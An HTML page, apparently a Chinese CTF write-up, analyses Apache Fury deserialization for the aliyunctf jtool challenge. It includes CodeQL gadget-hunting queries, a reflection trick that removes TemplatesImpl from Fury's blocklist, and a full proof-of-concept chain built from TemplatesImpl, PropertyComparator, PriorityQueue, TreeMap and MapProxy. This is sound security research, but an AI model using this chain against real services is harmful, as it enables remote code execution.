@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Fury反序列化&amp;aliyunctf-jtool | Jiecub3</title>
+<meta name="keywords" content="">
+<meta name="description" content="前言：当时看不懂这个，无意间看了下hessian反序列化，然后就有想法和思路了，然后看网上文章也是没有看到那个把这个讲明白的（也可能是我看得">
+<meta name="author" content="Jiecub3">
+<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/chain/fury%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96aliyunctf-jtool/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
+<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/chain/fury%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96aliyunctf-jtool/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Fury反序列化&amp;aliyunctf-jtool" />
+<meta property="og:description" content="前言：当时看不懂这个，无意间看了下hessian反序列化，然后就有想法和思路了，然后看网上文章也是没有看到那个把这个讲明白的（也可能是我看得" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/chain/fury%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96aliyunctf-jtool/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2025-04-27T20:01:23+08:00" />
+<meta property="article:modified_time" content="2025-07-02T20:01:23+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Fury反序列化&amp;aliyunctf-jtool"/>
+<meta name="twitter:description" content="前言：当时看不懂这个，无意间看了下hessian反序列化，然后就有想法和思路了，然后看网上文章也是没有看到那个把这个讲明白的（也可能是我看得"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://Jiecub3.github.io/zh/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Fury反序列化\u0026aliyunctf-jtool",
+      "item": "https://Jiecub3.github.io/zh/posts/java/chain/fury%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96aliyunctf-jtool/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Fury反序列化\u0026aliyunctf-jtool",
+  "name": "Fury反序列化\u0026aliyunctf-jtool",
+  "description": "前言：当时看不懂这个，无意间看了下hessian反序列化，然后就有想法和思路了，然后看网上文章也是没有看到那个把这个讲明白的（也可能是我看得",
+  "keywords": [
+    
+  ],
+  "articleBody": " 前言：当时看不懂这个，无意间看了下hessian反序列化，然后就有想法和思路了，然后看网上文章也是没有看到那个把这个讲明白的（也可能是我看得少hhh）\n这类非常规反序列化，就是查看他序列化和反序列化的逻辑，然后找可以利用的方法有哪些然后作为链子的开头（讲的有点笼统，下面来点实际的\n环境：用到aliyunctf-jtools的jar包，下载链接比赛官网应该还有\ncalc calc = new calc(); HashMap hashMap = new HashMap(); hashMap.put(\"val\", calc); Fury fury = Fury.builder().withLanguage(Language.JAVA) .requireClassRegistration(false) .build(); byte[] serialize = fury.serialize(hashMap); Fury ser_fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build(); Object deserialize = ser_fury.deserialize(serialize); 这个是我最初的一个demo\n0x01 序列化\u0026反序列化 逻辑 反序列化 直接看是怎么反序列化的吧，正常反序列化对象，会到这个default:中（调试到下图，前面的地方我就没记录，感觉记多了，文章挺臃肿，看得烦），然后调用每个对象的ClassInfo中设置的serializer#read方法进行还原这个对象，然后上面还有一些case 我简单看了没什么操作空间，都是还原一些常用类型（int什么的），而这个serializer是在序列化中设置的，那我们去看看序列化吧\n序列化 Fury有一个map存储了一些类的ClassInfo，这里类，序列化的时候会直接从这个map获取属于自己的ClassInfo\n然后看到有86对值，也就是有86个read方法可以查看相关的代码逻辑有没有可以利用的点（链子起点）\n当然除了map中记录之外的类，Fury也会生成serializer为其实现序列化\nthis.addSerializer(cls, this.createSerializer(cls)); 跟进this.createSerializer，然后一直到getSerializerClass()\n这里会对要序列化的class进行一些检测，然后在调用this.getObjectSerializerClass()获取Serializer的class，这里检测我主要关注了Serializable.class这个点，还有requireJavaSerialization()这个是因为里面有关于Serializable.class的判断，然后发现只要class不是以java开头即使没继承Serializable.class也可以被Fury反序列化，初步推断Fury是可以反序列化没继承Serializable.class的类\n然后跟this.getObjectSerializerClass()\n先会有一个checkNotInDisallowedList()黑名单检测，后面继续调试\n下面这个地方跟进去\n然后到下面这个classLoader.loadClass，为什么要跟这个地方等下就知道了\n0x02 动态生成的serializer classloader是ClassLoaderUtils$ByteArrayClassLoader来加载的，然后会到父类的loadClass方法，然后再到下图的findClass() 生成class\n他这个serializer是动态生成，到时候我们调试是调试不了其read()方法的，而这里我们可以得到其class的byte[]，下面后续的操作，就是通过加载byte[]生成class然后通过反射( newInstance() )得到serializer对象\n我们也可以通过这个byte[]生成class文件，查看其代码逻辑\nbyte[] bytes = {-54, -2, -70, -66, ...}; FileOutputStream fileOutputStream = new FileOutputStream(\"test.class\"); fileOutputStream.write(bytes); fileOutputStream.close(); 这里我是生成了一个TemplatesImpl.class的serializer（为什么选这个，因为经典纯牛奶）\n在调试那个黑名单检测时，运行下面这个就能绕过那个地方，然后生成我们的serializer\nDEFAULT_DISALLOWED_LIST_SET.map.remove(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\") 然后只有this.readAndSetFields里面逻辑能审计下，但是基本上也没看到什么反序列化后对方法的调用也可能是类没选对，但是那个(就是这个class怎么生成这些的，感兴趣的可以再深入分析分析)\n0x03 链子查找 回到之前的86个read方法，这里我其实想起了hessian反序列化的hashmap，然后我反序列化了一个hashmap\n看到下面这里，会先反序列化key和value，然后进行map.put，这里不就能进行利用了么（对象调用）\nhash,hashcode,equals都能利用了哇 然后我们在看到HashMapSerializer上面的上面是继承AbstractMapSerializer，其再继承Serializer\n86个read我总不能挨个去看吧，但是我们起点大致可以设置为继承Serializer的read方法\n思路 这里大致就两种吧\n通过read为起点，到sink点 通过read为起点，到jdk原生反序列化，readobject再到sink点 sink点 source点自然是继承Serializer的read方法\n起初是用tabby尝试找链子的，然后感觉tabby找得有点力不从心。然后去折腾ql了,也折腾了会吧。相对来说ql给我的感觉会复杂很多，然后自我感觉这篇文章后面内容不是很好，想着写一半了都，还是完个结吧\n先讲sink点吧，因为跟思路对应些，有点照着答案找链子的意思了（苦笑\n这里fury本身自带200+类的过滤，然后出题人又加了一个com.feilong.lib的过滤，所以也能往二次反序列化这个方向想吧\n那也就是先找readObject点了呗\nimport java // 定义 ObjectInputStream 及其子类类型 class OISFamily extends RefType { OISFamily() { this.hasQualifiedName(\"java.io\", \"ObjectInputStream\") or this.getASupertype+().hasQualifiedName(\"java.io\", \"ObjectInputStream\") } } // 查找所有调用 from MethodCall call, Method method where method.hasName(\"readObject\") and method.getDeclaringType() instanceof OISFamily and call.getMethod() = method and not call.getEnclosingCallable().getDeclaringType().getQualifiedName().matches(\"%com.feilong.lib%\") and call.getEnclosingCallable().getName()!=\"readObject\" select call, call.getEnclosingCallable().getName(),call.getEnclosingCallable().getDeclaringType().getQualifiedName() 看了下最有机会的是IoUtil和JavaSerializer吧，其他方法不太可能调用到\n然后就去看怎么调用到JavaSerializer，然后我又去把序列化和反序列化的流程又去看了篇，得出调用不了（不在map里，其他点也没发现能调用到的），估计是专门fury.register才行,用来提高兼容性的 感觉www。然后还去想了下能不能从序列化byte[]里面构造出JavaSerializer，让他反序列化去调用\n看了反序列化对byte[]的处理发现不行hh，他map中Serializer，在序列化byte[]里面会存一个索引，反序列化的时候直接去map调用对应索引得到对应的Serializer，而不是map中，会和序列化一样的步骤去newSerializer。所以也操作不了\n那就把点看到IoUtil，然后这里思路就应该先从read想办法往这个点调用了，直接查出来的有很多都是走clone()的。后面看有没有机会再说，先把wp的那条整了，这里一直往上找可以到AbstractConverter#convert\n我觉得ql不刻意写，应该还不能通过cb getter那个点(不只是getter)到get触发invoke再到convert吧\n这里就分为两段了，后面这段我就直接找invoke到convertInternal（这里result有很多，就直接先写的invoke的）\n/** @kind path-problem */ import java import semmle.code.java.dataflow.FlowSources class GetMethod extends Method { GetMethod(){ this.getDeclaringType().getASupertype*().hasQualifiedName(\"java.lang.reflect\", \"InvocationHandler\") and this.getName().matches(\"invoke\") } } class LookupMethod extends Method { LookupMethod() { this.getName()=\"convert\" and this.getDeclaringType().getQualifiedName().matches(\"cn.hutool.core.convert.AbstractConverter%\") } } query predicate edges(Method a, Method b) { a.polyCalls(b) } from GetMethod source, LookupMethod sink where edges+(source, sink) select source, source, sink, \"$@ $@ to $@ $@\" , source.getDeclaringType(),source.getDeclaringType().getName(), source,source.getName(), sink.getDeclaringType(),sink.getDeclaringType().getName(), sink,sink.getName() 可以看到这里这条和wp中还挺符合的\nsource点 然后这里找到read到compare就没那么像的了\n/** @kind path-problem */ import java import semmle.code.java.dataflow.FlowSources class GetMethod extends Method { GetMethod(){ exists(Method m,Parameter p| m.hasName(\"read\") and m.getDeclaringType().getASupertype*().getQualifiedName().matches(\"org.apache.fury.serializer.Serializer%\") and exists(m.getAnOverride()) and p.getType().(RefType).hasQualifiedName(\"org.apache.fury.memory\", \"MemoryBuffer\") and p.getName() != \"p0\" and m = p.getCallable() and this = m ) } } class LookupMethod extends Method { LookupMethod() { exists(MethodCall a| a.getCallee().getName()=\"getProperty\" and this = a.getCaller() ) } } query predicate edges(Method a, Method b) { a.polyCalls(b) } from GetMethod source, LookupMethod sink where edges+(source, sink) and sink.getDeclaringType().getQualifiedName().matches(\"com.feilong.core.util.comparator.PropertyComparator%\") select source, source, sink, \"$@ $@ to $@ $@\" , source.getDeclaringType(),source.getDeclaringType().getName(), source,source.getName(), sink.getDeclaringType(),sink.getDeclaringType().getName(), sink,sink.getName() 可以看到是有偏差的，然后这里read方法有很多，其实很多可以排除，因为要调用到才行 \u0026 能储存对象才行（比如map）这种，因为不能储存对象的话，你后续gadget也无法展开（因为你起点类最少要满足能还原一个对象，并使这个对象调用一个方法吧）。然后我看了大多结果，很多都可以排除掉，也就是可以去看他定义了的mapSerializer中有那些，然后看class类型进行筛选，然后对codeql source进行限制。然后还有很多read后面也是指向CollectionSerializer#read，所以这个点多少也会去研究下。\n然后正常思路肯定不会直接就找compare方法嘛（纯照答案找），思路的话我觉得\n可以有个sinkmethod集合，然后找这个集合（就是误报很多就是了hh） edges几层，然后看这几层里面有那些函数可以利用，但是这个误报就太太大了 然后这里compare不是没找到对应的链子，我去看了下jdk的类，codeql是怎么处理的，然后发现是调用的class文件，而且感觉节点也出了问题，比如siftUpUsingComparator这个方法就找不到。\nimport java from RefType queueType, Method m where m.getDeclaringType().getASupertype*().getQualifiedName().matches(\"java.util.PriorityQueue%\") select m,m.getLocation().getFile().getAbsolutePath() 然后我去找个了jdk的源码一起加到数据库里，但是生成要很久，而且很卡（我是直接反编译，然后codeql database create db-name --language=java --source-root=./sources --build-mode=none，生成的）有好的方法，希望师傅们安利下hh（win10）\n生成之后原本的没找出来，treeMap的找出来，hhh。\n然后用treemap改了下开头是可以打的，构造有些小问题，防止生成的时候触发poc，也是用最暴力的反射解决了\npackage tostring_test; import cn.hutool.core.map.BiMap; import cn.hutool.core.map.MapProxy; import cn.hutool.core.util.ReflectUtil; import cn.hutool.core.util.SerializeUtil; import com.feilong.core.util.comparator.PropertyComparator; import com.feilong.lib.collection4.iterators.FilterIterator; import com.feilong.lib.digester3.ObjectCreationFactory; import com.google.common.collect.ArrayListMultimap; import com.google.common.collect.Multimap; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassPool; import org.apache.fury.Fury; import org.apache.fury.config.Language; import org.apache.fury.serializer.JavaSerializer; import java.lang.invoke.SerializedLambda; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; import java.util.PriorityQueue; import java.util.TreeMap; import com.google.common.base.Predicate; public class compare_test { static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field declaredField = obj.getClass().getDeclaredField(fieldName); declaredField.setAccessible(true); declaredField.set(obj, value); } public static void main(String[] args) throws Exception, IllegalAccessException { byte[] bytes = ClassPool.getDefault().get(calc.class.getName()).toBytecode(); TemplatesImpl tmpl = new TemplatesImpl(); Field bytecodes = TemplatesImpl.class.getDeclaredField(\"_bytecodes\"); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]{bytes}); Field name = TemplatesImpl.class.getDeclaredField(\"_name\"); name.setAccessible(true); name.set(tmpl, \"hello\"); TemplatesImpl tmpl1 = new TemplatesImpl(); Field bytecodes1 = TemplatesImpl.class.getDeclaredField(\"_bytecodes\"); bytecodes1.setAccessible(true); bytecodes1.set(tmpl1, new byte[][]{bytes}); Field name1 = TemplatesImpl.class.getDeclaredField(\"_name\"); name1.setAccessible(true); name1.set(tmpl1, \"hello2\"); ///templates // String prop = \"digester\"; String prop = \"digester\"; PropertyComparator propertyComparator = new PropertyComparator(prop); Map TreeMap = new TreeMap(propertyComparator); Object templatesImpl1 = tmpl1; Object templatesImpl = tmpl; PropertyComparator propertyComparator1 = new PropertyComparator(\"outputProperties\"); PriorityQueue priorityQueue1 = new PriorityQueue(2, propertyComparator1); ReflectUtil.setFieldValue(priorityQueue1, \"size\", \"2\"); Object[] objectsjdk = {templatesImpl1, templatesImpl}; setFieldValue(priorityQueue1, \"queue\", objectsjdk); /////jdk byte[] data = SerializeUtil.serialize(priorityQueue1); Map hashmap = new HashMap(); hashmap.put(prop, data); MapProxy mapProxy = new MapProxy(hashmap); ObjectCreationFactory test = (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), new Class[]{ObjectCreationFactory.class}, mapProxy); ObjectCreationFactory test1 = (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), new Class[]{ObjectCreationFactory.class}, mapProxy); TreeMap.put(test,1); // TreeMap.put(test1,2); // setFieldValue(TreeMap,\"comparator\", propertyComparator); // TreeMap.put(1234,123); // TreeMap.put(1234,123); // root = new TreeMap.Entry\u003c\u003e(\"key\", \"value\", null); Constructor\u003c?\u003e declaredConstructor = Class.forName(\"java.util.TreeMap$Entry\").getDeclaredConstructors()[0]; declaredConstructor.setAccessible(true); Object root_test1 = declaredConstructor.newInstance( test1, 2, null); Field root = TreeMap.getClass().getDeclaredField(\"root\"); root.setAccessible(true); Object Troot = root.get(TreeMap); Field left = Troot.getClass().getDeclaredField(\"right\"); left.setAccessible(true); left.set(Troot, root_test1); root.set(TreeMap, Troot); setFieldValue(TreeMap,\"size\",2); setFieldValue(TreeMap,\"modCount\",2); // TreeMap.put(test1,1232); // BiMap hashMap = new BiMap(hashMap1); Fury fury = Fury.builder().withLanguage(Language.JAVA) .requireClassRegistration(false) .build(); byte[] serialize = fury.serialize(TreeMap); Object deserialize = fury.deserialize(serialize); } } 差不多就先这样吧\n其实我ql最初路走偏了，然后我就像通过call这种向上找（convert那个点），为什么不用tabby呢（我找出来很不全），\n然后我就去找AbstractConverter#convert会有哪些调用到，但是始终找不全，idea是有16个，tabby8个，ql始终是只有13个。然后去看ql是什么原因导致的。发现有个点位应该被找到的但是结果里面没有（见下图），DateConverter.convert这个点和下面TemporalAccessorConverter这个条件肯定是一样的。DateConverter是继承AbstractConverter是符合的，不知道为什么找不到，然后找了对应的类NumberWithFormat所有的caller点，也是没DateConverter.convert（感觉是数据库生成节点的问题啊，有大哥懂的，解答下小弟）\nimport java from RefType abstractConverter, RefType subclass,Method m,MethodCall mcall where (abstractConverter.getQualifiedName().matches(\"cn.hutool.core.convert.Converter\u003c%\") or abstractConverter.getQualifiedName().matches(\"cn.hutool.core.convert.Converter\") )and subclass.getASupertype*() = abstractConverter and m.getDeclaringType()=subclass and m.hasName(\"convert\") and mcall.getMethod()=m and (m.getDeclaringType().getQualifiedName().matches(\"cn.hutool.core.convert.Converter%\") or m.getDeclaringType().getQualifiedName().matches(\"cn.hutool.core.convert.AbstractConverter%\")) select m,m.getDeclaringType(),mcall,mcall.getEnclosingCallable().getDeclaringType() ",
+  "wordCount" : "4303",
+  "inLanguage": "zh",
+  "datePublished": "2025-04-27T20:01:23+08:00",
+  "dateModified": "2025-07-02T20:01:23+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Jiecub3"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://Jiecub3.github.io/zh/posts/java/chain/fury%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96aliyunctf-jtool/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Jiecub3",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://Jiecub3.github.io/img/logo.gif"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://Jiecub3.github.io/zh/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/search" title="搜索🔍︎">
+                    <span>搜索🔍︎</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">🏠主页</a>&nbsp;»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Fury反序列化&amp;aliyunctf-jtool
+    </h1>
+    <div class="post-meta"><span title='2025-04-27 20:01:23 +0800 CST'>2025-04-27</span>&nbsp;·&nbsp;9 分钟&nbsp;·&nbsp;Jiecub3
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">目录</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#0x01-%e5%ba%8f%e5%88%97%e5%8c%96%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96-%e9%80%bb%e8%be%91" aria-label="0x01 序列化&amp;amp;反序列化 逻辑">0x01 序列化&amp;反序列化 逻辑</a></li>
+                    <li>
+                        <a href="#0x02-%e5%8a%a8%e6%80%81%e7%94%9f%e6%88%90%e7%9a%84serializer" aria-label="0x02 动态生成的serializer">0x02 动态生成的serializer</a></li>
+                    <li>
+                        <a href="#0x03-%e9%93%be%e5%ad%90%e6%9f%a5%e6%89%be" aria-label="0x03 链子查找">0x03 链子查找</a><ul>
+                            
+                    <li>
+                        <a href="#sink%e7%82%b9" aria-label="sink点">sink点</a></li>
+                    <li>
+                        <a href="#source%e7%82%b9" aria-label="source点">source点</a>
+                    </li>
+                </ul>
+                </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+
+  <div class="post-content"><blockquote>
+<p>前言：当时看不懂这个，无意间看了下<code>hessian反序列化</code>，然后就有想法和思路了，然后看网上文章也是没有看到那个把这个讲明白的（也可能是我看得少hhh）</p>
+</blockquote>
+<blockquote>
+<p>这类非常规反序列化，就是查看他<code>序列化和反序列化的逻辑</code>，然后找<code>可以利用的方法</code>有哪些然后作为<code>链子的开头</code>（讲的有点笼统，下面来点实际的</p>
+</blockquote>
+<p>环境：用到aliyunctf-jtools的jar包，下载链接比赛官网应该还有</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">calc</span><span class="w"> </span><span class="n">calc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">calc</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">HashMap</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">hashMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;val&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">calc</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Fury</span><span class="w"> </span><span class="n">fury</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Fury</span><span class="p">.</span><span class="na">builder</span><span class="p">().</span><span class="na">withLanguage</span><span class="p">(</span><span class="n">Language</span><span class="p">.</span><span class="na">JAVA</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="na">requireClassRegistration</span><span class="p">(</span><span class="kc">false</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="na">build</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">serialize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fury</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">hashMap</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Fury</span><span class="w"> </span><span class="n">ser_fury</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Fury</span><span class="p">.</span><span class="na">builder</span><span class="p">().</span><span class="na">withLanguage</span><span class="p">(</span><span class="n">Language</span><span class="p">.</span><span class="na">JAVA</span><span class="p">).</span><span class="na">requireClassRegistration</span><span class="p">(</span><span class="kc">false</span><span class="p">).</span><span class="na">build</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Object</span><span class="w"> </span><span class="n">deserialize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ser_fury</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="n">serialize</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><p>这个是我最初的一个demo</p>
+<h2 id="0x01-序列化反序列化-逻辑">0x01 序列化&amp;反序列化 逻辑<a hidden class="anchor" aria-hidden="true" href="#0x01-序列化反序列化-逻辑">#</a></h2>
+<ul>
+<li><strong>反序列化</strong></li>
+</ul>
+<p>直接看是怎么反序列化的吧，<code>正常反序列化对象</code>，会到这个<code>default:</code>中（调试到下图，前面的地方我就没记录，感觉记多了，文章挺<strong>臃肿</strong>，看得烦），然后调用每个对象的<code>ClassInfo</code>中设置的<code>serializer#read</code>方法进行<code>还原这个对象</code>，然后上面还有一些case 我简单看了没什么操作空间，都是<code>还原一些常用类型</code>（int什么的），而这个<code>serializer</code>是在<code>序列化</code>中设置的，那我们去看看序列化吧</p>
+<p><img loading="lazy" src="../images/image-20250321090424683.png" alt="image-20250321090424683"  />
+</p>
+<ul>
+<li><strong>序列化</strong></li>
+</ul>
+<p>Fury有一个map存储了<code>一些类的ClassInfo</code>，这里类，序列化的时候会直接从这个<code>map获取</code>属于自己的ClassInfo</p>
+<p><img loading="lazy" src="../images/image-20250321091433160.png" alt="image-20250321091433160"  />
+</p>
+<p><img loading="lazy" src="../images/image-20250321091740429.png" alt="image-20250321091740429"  />
+</p>
+<p>然后看到有<code>86对值</code>，也就是有<code>86个read方法</code>可以查看<code>相关的代码逻辑</code>有没有可以<code>利用的点（链子起点）</code></p>
+<p>当然除了map中记录之外的类，Fury也会生成<code>serializer</code>为其<code>实现序列化</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="na">addSerializer</span><span class="p">(</span><span class="n">cls</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">createSerializer</span><span class="p">(</span><span class="n">cls</span><span class="p">));</span><span class="w">
+</span></span></span></code></pre></div><p>跟进<code>this.createSerializer</code>，然后一直到<code>getSerializerClass()</code></p>
